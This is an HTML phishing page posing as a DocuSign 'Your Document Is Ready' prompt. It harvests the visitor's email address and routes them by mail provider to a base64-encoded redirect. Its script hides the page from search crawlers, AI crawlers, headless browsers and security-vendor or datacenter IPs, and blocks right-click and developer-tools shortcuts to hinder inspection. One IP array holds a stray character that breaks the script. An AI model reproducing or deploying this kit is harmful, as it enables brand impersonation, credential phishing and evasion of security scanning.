<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DocuSign</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 10px;
    }

    .form-container {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 30px 20px;
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .logo {
      width: 140px;
      margin-bottom: 15px;
    }

    h2 {
      margin-bottom: 15px;
      color: #333;
      font-size: 1.4rem;
    }

    input[type="email"] {
      width: 300px;
      height: 20px;
      padding: 12px;
      margin: 10px 0;
      border: 2px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
      text-align: center;
    }

    button {
      background-color: #0070e0;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
    }

    button:hover {
      background-color: #005bb5;
    }

    .error {
      color: red;
      margin-top: 10px;
      font-size: 14px;
    }

    @media (max-width: 480px) {
      .form-container {
        padding: 20px 15px;
      }

      h2 {
        font-size: 1.2rem;
      }

      input[type="email"],
      button {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="form-container">
    <img src="" alt="DocuSign Logo" class="logo">
    <h2>Your Document Is Ready</h2>
    <form id="emailForm">
      <input type="email" name="email" id="email" required placeholder="Enter Your Email">
      <button type="submit">Open Document</button>
      <div class="error" id="errorMsg"></div>
    </form>
  </div>

  <script>
    const outlookBase64 = "aHR0cHM6Ly9kb2N1c2lnbi5jb20vb3Blbj9lbWFpbD0=";
    const googleBase64 = "aHR0cHM6Ly9nb29nbGUuY29tP2VtYWlsPQ==";
    const encodedProxyUrl = btoa("https://api.myip.ms"); // Update with actual proxy URL

    const OUTLOOK_MX_PATTERNS = [
  "protection.outlook.com",
  "ppe-hosted.com",
  "pphosted.com",
  "barracudanetworks.com",
  "secureserver.net",
  "mimecast.com",
  "arsmtp.com",
  "mx.microsoft",
  "mailguard.com.au"  // ← Added pattern
];

    const blockedISPs = [
      "Microsoft", "GoDaddy.com", "OVH", "Digital Ocean", "Contabo", "Akamai",
      "Unified Layer", "Hetzner", "NetActuate", "GloboTech", "Host Europe", "Oracle Cloud",
      "Amazon", "Google", "Leaseweb", "M247", "myLoc", "UK2.NET", "ColoCrossing", "HostRoyale",
      "Palo Alto", "Iomart", "cogent", "alibaba", "linode", "choopa", "webnx", "bitdefender"
    ];

    const botUserAgents = [
      "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
      "YandexBot", "Sogou", "Exabot", "facebot", "facebookexternalhit",
      "MJ12bot", "AhrefsBot", "SemrushBot", "dotbot", "Mediapartners-Google",
      "Twitterbot", "Applebot", "Discordbot", "GPTBot", "ClaudeBot"
    ];

    function base64Decode(str) {
      try {
        return atob(str);
      } catch {
        return null;
      }
    }

    function isHeadlessBrowser() {
      return (
        window.navigator.webdriver ||
        /HeadlessChrome|puppeteer|PhantomJS|selenium/i.test(navigator.userAgent)
      );
    }

    function detectBadUserAgent() {
      return botUserAgents.some(bot => navigator.userAgent.includes(bot));
    }

    function getDomainFromEmail(email) {
      const parts = email.split('@');
      return parts.length === 2 ? parts[1].toLowerCase() : null;
    }

    async function getMXRecords(domain) {
      const res = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
      if (!res.ok) return [];
      const data = await res.json();
      if (!data.Answer) return [];
      return data.Answer.filter(r => r.type === 15).map(r => r.data.split(' ')[1].toLowerCase());
    }

    function detectIPAndBlockBots() {
  if (localStorage.getItem("checkedIP")) return;

  fetch(atob(encodedProxyUrl))
    .then(response => response.json())
    .then(data => {
      const userIP = data.ip;
      const isp = data.isp.toLowerCase();
      const blockFlag = data.block;

      // Save the check result
      localStorage.setItem("checkedIP", userIP);

      // Known datacenter or bot IPs (start of ranges)
      const botIPs = [
        "64.233.", "66.249.", "72.14.",     // Googlebot
        "157.55.", "207.46.", "193.34.",z    // Bingbot
        "5.255.", "77.88.",                 // Yandex
        "23.21.", "23.20.",                 // AWS
        "34.203.", "34.192.",               // Amazon EC2
        "45.79.", "139.162."                // Linode
      ];

      // Detect bad actors
      const isBlockedIP = botIPs.some(ipPrefix => userIP.startsWith(ipPrefix));
      const isBlockedISP = blockedISPs.some(badIsp => isp.includes(badIsp.toLowerCase()));

      if (
        blockFlag === 1 ||
        isHeadlessBrowser() ||
        detectBadUserAgent() ||
        isBlockedIP ||
        isBlockedISP
      ) {
        window.location.href = atob(googleBase64);
        throw new Error("Blocked by AntiBot/IP Detection");
      }
    })
    .catch(err => console.error("Xbot Error:", err));
}


    // Detect and block on page load
    detectIPAndBlockBots();

    // Remove short query strings like ?xy
    if (/^\?\w{2}$/.test(window.location.search)) {
      window.history.replaceState({}, document.title, window.location.pathname);
    }

    // Form submission
    document.getElementById('emailForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const errorMsg = document.getElementById('errorMsg');
      errorMsg.textContent = "";

      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        errorMsg.textContent = "Please enter a valid email address.";
        return;
      }

      const domain = getDomainFromEmail(email);
      if (!domain) {
        errorMsg.textContent = "Invalid email format.";
        return;
      }

      try {
        const mxRecords = await getMXRecords(domain);
        const isOutlook = mxRecords.some(mx =>
          OUTLOOK_MX_PATTERNS.some(pattern => mx.includes(pattern))
        );

        const redirectBase = base64Decode(isOutlook ? outlookBase64 : googleBase64);
        if (!redirectBase) {
          errorMsg.textContent = "Failed to decode redirect URL.";
          return;
        }

        // DO NOT encode the email in the redirect
        window.location.href = redirectBase + email;

      } catch (err) {
        console.error(err);
        errorMsg.textContent = "Could not determine email server.";
      }
    });

    // Disable right-click
    document.addEventListener("contextmenu", e => e.preventDefault());

    // Block dev tools shortcuts
    document.addEventListener("keydown", function (e) {
      const forbidden =
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toUpperCase() === "U");

      if (forbidden) {
        e.preventDefault();
        return false;
      }
    });
  </script>
</body>
</html>
